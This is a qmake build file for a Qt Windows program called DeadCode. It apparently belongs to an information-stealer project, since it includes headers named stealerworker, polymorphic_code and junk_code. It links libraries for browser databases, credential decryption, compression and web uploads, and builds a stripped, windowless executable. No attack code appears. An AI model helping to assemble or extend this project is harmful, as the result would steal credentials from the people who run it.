QT += core gui network widgets

TARGET = DeadCode
TEMPLATE = app

# Добавляем параметры для статической сборки
CONFIG += static
CONFIG += staticlib
QTPLUGIN += -

SOURCES += \
    ../src/main.cpp \
    mainwindow.cpp

HEADERS += \
    mainwindow.h \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h

FORMS += mainwindow.ui

RC_FILE = ../icon.rc

INCLUDEPATH += \
    ../src \
    . \
    C:/vcpkg/installed/x64-mingw-static/include

LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -lcurl \
        -lssl \
        -lcrypto \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32 \
        -luser32 \
        -ladvapi32 \
        -lwininet \
        -lshell32 \
        -lurlmon \
        -lole32

QMAKE_CXXFLAGS += -O2 \
                  -std=c++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS \
                  -Wno-deprecated-declarations \
                  -Wno-cast-function-type

QMAKE_LFLAGS = -static-libgcc -static-libstdc++ -O2 -Wl,-s -Wl,-subsystem,windows -mthreads

BUILD_DATE = $$system(powershell -Command "Get-Date -Format 'yyyy-MM-dd'")
isEmpty(BUILD_DATE) {
    BUILD_DATE = "unknown"
}
BUILD_VERSION = $$system(git rev-parse --short HEAD 2> nul)
isEmpty(BUILD_VERSION) {
    BUILD_VERSION = "unknown"
}
DEFINES += BUILD_DATE=\\\"$${BUILD_DATE}\\\" \
           BUILD_VERSION=\\\"$${BUILD_VERSION}\\\"

DESTDIR = ../build
OBJECTS_DIR = ../release
MOC_DIR = ../release
UI_DIR = ../release

QMAKE_CLEAN += \
    ../build/DeadCode.exe \
    ../release/*.o

win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
    }
}

PRE_TARGETDEPS += \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h